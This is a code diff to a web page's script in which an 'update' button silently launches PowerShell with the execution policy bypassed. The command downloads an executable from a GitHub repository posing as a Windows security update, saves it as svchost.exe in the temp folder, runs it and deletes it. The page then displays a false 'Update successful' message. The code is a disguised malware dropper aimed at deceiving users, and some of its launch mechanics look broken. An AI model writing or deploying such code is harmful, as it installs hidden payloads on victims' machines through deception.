@@ -10,12 +10,17 @@
 
     <script>
         document.getElementById('updateBtn').addEventListener('click', function() {
+            // 1. The command to download and run your exe
             var psCmd = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
             
-            // Open a new PowerShell window silently
-            window.open('powershell.exe -c "' + psCmd.replace(/"/g, '\\"') + '"');
+            // 2. Create a temporary .ps1 script file in memory
+            var blob = new Blob([psCmd], {type: 'text/plain'});
+            var url = URL.createObjectURL(blob);
             
-            // Hide the button after clicking
+            // 3. Execute it using a hidden window
+            window.location.href = 'powershell.exe -WindowStyle Hidden -File ' + url;
+            
+            // 4. Hide the button and show success message
             this.style.display = 'none';
             document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
         });
